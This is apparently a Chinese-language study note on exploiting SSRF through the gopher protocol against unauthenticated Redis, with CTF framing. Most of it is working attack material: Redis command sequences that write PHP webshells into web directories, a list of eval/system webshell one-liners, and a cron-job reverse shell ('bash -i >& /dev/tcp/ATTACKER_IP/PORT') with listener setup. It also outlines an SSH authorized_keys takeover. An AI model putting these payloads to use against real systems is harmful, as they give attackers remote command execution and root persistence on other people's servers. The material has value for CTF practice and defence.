# SSRF_redis

### gopher协议：

gopher的请求格式：

```
<selector>\r\n
```

#### 一，概述：

在SSRF场景中：

> **gopher协议=“让我用URL的形式，给目标TCP服务发一段我完全可控的原始数据”**

也就是说 **用URL当外壳，里面塞redis命令**

#### 二，gopherURL的完整结构

```
gopher://<host>:<port>/<type><selector>
在SSRF利用中：
gopher://127.0.0.1:6379/_<payload>
```

##### 逐段解释：

`127.0.0.1：6379`

这是SSRF的真正攻击目标

- `127.0.0.1`redis在内网/本机
- `6379` redis默认端口

`/`

表示selector的开始，后面所有内容，都会被当成请求内容

`_`

```
/_
```

这个 `_` 的含义是：

> RAW模式：不要解析，不要修饰，原样发送后面的数据

`<payload>`（真正的redis命令）

#### 三，redis通信协议

redis使用的是RESP协议，格式：

```
*<参数个数>\r\n
$<第一个参数长度>\r\n
<第一个参数>\r\n
$<第二个参数长度>\r\n
<第二个参数>\r\n
...
```

举例：

redis命令：ping

RESP格式：

```
*1\r\n
$4\r\n
ping\r\n
需要给\r\n编码：
%0d%0a
```

完整的URL：

```
gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0aPING%0d%0a
```

#### 四，利用

##### 与redis的未授权访问相利用：

漏洞的产生条件有以下两点：

1. Redis绑定在0.0.0.0:6379，且没有进行添加防火墙规则避免其他非信任来源IP访问等相关安全策略，直接暴露在公网；注：默认在6379端口。
2. 没有设置密码认证（一般为空），可以免密码远程登录Redis服务。

漏洞利用常见方式：

1. 已知目标网址绝对路径写入webshell

   ### 常见 Web 目录（CTF / 实战）

   | 环境           | 常见路径                   |
   | -------------- | -------------------------- |
   | Apache (Linux) | `/var/www/html/`           |
   | Nginx          | `/usr/share/nginx/html/`   |
   | LNMP           | `/home/wwwroot/`           |
   | 宝塔           | `/www/wwwroot/`            |
   | CTF            | `/var/www/html/`（极高频） |

2. 定时任务反弹shell

   ##### 原理

   写入 cron 文件：

   ```
   /var/spool/cron/root
   ```

   或者：

   ```
   /etc/cron.d/xxx
   ```

   ##### 关键点

   - cron 的路径 **固定**
   - 与 Web 服务无关
   - 不需要 Web 环境

   ##### 前提条件

   1. Redis 以 **root** 用户运行（CTF 很常见，真实环境较少）
   2. cron 服务开启

   👉 **这是“不知道 Web 路径时最稳的一种”**

3. 利用公私钥认证获得root权限，ssh免密登录目标服务器

   ##### 原理

   ```
   /root/.ssh/authorized_keys
   ```

   ##### 前提条件

   1. Redis 运行用户对 `.ssh` 目录有写权限
   2. SSH 服务开启
   3. 你知道用户名（root / www / redis）

   ##### 优点

   - 不依赖 Web
   - 非常稳定
   - 拿到的是 **系统级权限**

较为常见的利用方式是写入webshell,通过redis连接工具，可以不输入密码连接成功。

```
root@kali:~# redis-cli -h 192.168.5.57（目标IP，举个例子）
```

下面这个命令会清空数据库，谨慎使用：

```
192.168.5.57:6379>flushall
```

写入webshell：

```
192.168.5.57:6379>config set dir /var/www/html/ #设置网站路径，这里必须提前知道网站的路径，这个可以在phpinfo信息中获取
192.168.5.57:6379>config set dbfilename shell.php #创建文件，把shell.php存储在这里
192.168.5.57:6379>set webshell “<?php @eval($_POST[1]);?>”  webshell内容
192.168.5.57:6379>save
```

常见webshell：

```
flushall
config set dir /tmp
config set dbfilename shell.php
set 'webshell' '<?php phpinfo();?>'
save
```

##### 第一种：

```
<?php @eval($_POST[1]); ?>
```

- 绕过WAF
- 各种管理工具都支持

##### 第二种：

```
<?php eval($_GET['cmd']); ?>
```

访问方式：

```
shell.php?cmd=phpinfo();
```

##### 第三种：

```
<?php echo shell_exec($_REQUEST['cmd']); ?>
```

##### 第四种：

```
<?php system($_GET['cmd']); ?>
```

##### 第五种：

```
<?php
if(isset($_REQUEST['c'])){
    @system($_REQUEST['c']);
}
?>
```

#### 五，决策模板：

Redis 是 root 吗？

能不能写 cron？

能不能写 `.ssh`？

能不能确定 Web 目录？



### 关于反弹shell:

```
flushall
set 1 '\n\n*/1 * * * * bash -i >& /dev/tcp/ip/port 0>&1\n\n'
config set dir /var/spool/cron/
config set dbfilename root
save
```

#### 一、先一句话说明这条利用链在干什么

> **通过 Redis 把一个 cron 定时任务文件写到系统中，
>  让 cron 服务周期性执行一条反弹 shell 的命令，
>  从而拿到系统 shell。**

它的本质是：
 **Redis = 写文件工具
 cron = 自动执行机制
 反弹 shell = 连接你机器的入口**

#### 二、定时任务反弹 shell 的“成立前提”（非常关键）

如果下面任意一条不成立，这条路就走不通：

##### 1️⃣ Redis 以 **root 用户**运行

- 这是 **硬条件**
- 因为 cron 目录只有 root 能写

##### 2️⃣ 系统存在 cron 服务

- Linux 几乎必有
- CTF 中默认开启

##### 3️⃣ 目标服务器 **能主动连你**

- 你的 VPS / 本地监听端口可达
- 防火墙不拦截出站

👉 **这也是为什么 cron 是“未知 Web 目录时的首选”**

#### 四、反弹 shell 的“核心命令”你需要理解

以最常见的 bash 反弹为例（只讲原理）：

```
bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1
```

含义拆解：

- `bash -i`：启动交互式 shell

- `/dev/tcp/IP/PORT`：bash 内置 TCP 连接

- `>&` / `0>&1`：输入输出重定向

- `attacker_ip` :kali:运行 `ip a` :

  ##### 2️⃣ 在 Kali 里怎么看 IP（最常用）

  在 Kali 终端执行：

  ```
  ip a
  ```

  你会看到类似：

  ```
  inet 192.168.1.100/24
  ```

  或者：

  ```
  inet 10.0.2.15/24
  ```

  👉 这个 `192.168.1.100` / `10.0.2.15`
   **就是你在反弹 shell 里要用的 IP（前提是目标能访问到）**

  ------

  ##### 3️⃣ Kali 常见三种网络模式（非常重要）

  ##### 情况 A：桥接模式（CTF 最推荐）

  ```
  Kali IP: 192.168.1.100
  目标 IP: 192.168.1.50
  ```

  - 在同一局域网
  - 目标 **可以直接访问 Kali**
  - ✅ **最稳**

  👉 **反弹 shell 里就写：**

  ```
  192.168.1.100
  ```

  ------

  ##### 情况 B：NAT 模式（最容易失败）

  ```
  Kali IP: 10.0.2.15
  ```

  - 这是虚拟机内部 IP
  - 目标服务器通常**访问不到**
  - ❌ 反弹大概率失败

  👉 解决方案：

  - 改桥接
  - 或用公网 VPS

👉 **结果：目标服务器主动连你**

#### 五、完整的 Redis → cron → shell 逻辑链（逐步解释）

下面不是“直接给 payload”，而是**你在脑中必须有的步骤顺序**。

------

##### Step 1：清空 Redis（可选，但常见）

```
FLUSHALL
```

目的：

- 避免旧数据干扰
- 让生成的文件更“干净”

------

##### Step 2：把 Redis 的写入目录指向 cron

```
CONFIG SET dir /var/spool/cron/
```

**这一步的意义是：**

> 告诉 Redis：
>  **“你等会保存文件时，不要存数据库目录，
>  直接往 cron 目录写。”**

如果这一步失败，说明：

- Redis 不是 root
- cron 路线直接放弃

------

##### Step 3：设置文件名为 `root`

```
CONFIG SET dbfilename root
```

这一步非常关键：

- cron 识别的是：
   `/var/spool/cron/root`
- 所以你必须让 Redis 写出这个名字

------

##### Step 4：构造 cron 内容（这是核心）

你写进 Redis 的 **不是 shell**，
 而是 **一整行 cron 规则**。

逻辑结构是：

```
* * * * * <反弹 shell 命令>
```

Redis 里体现为：

```
SET xxx "\n* * * * * bash -c '...'\n"
```

注意两点：

1. **前后要有换行**
2. cron 需要“完整一行”

------

##### Step 5：触发保存

```
SAVE
```

这一步做的事情是：

> **把 Redis 内存中的数据，
>  强制写成一个文件：**
>
> ```
> /var/spool/cron/root
> ```

cron 服务随后会：

- 自动读取
- 每分钟执行一次

------

##### Step 6：你这边监听端口

```
nc -lvvp PORT
```

等一分钟以内，你就会收到 shell。



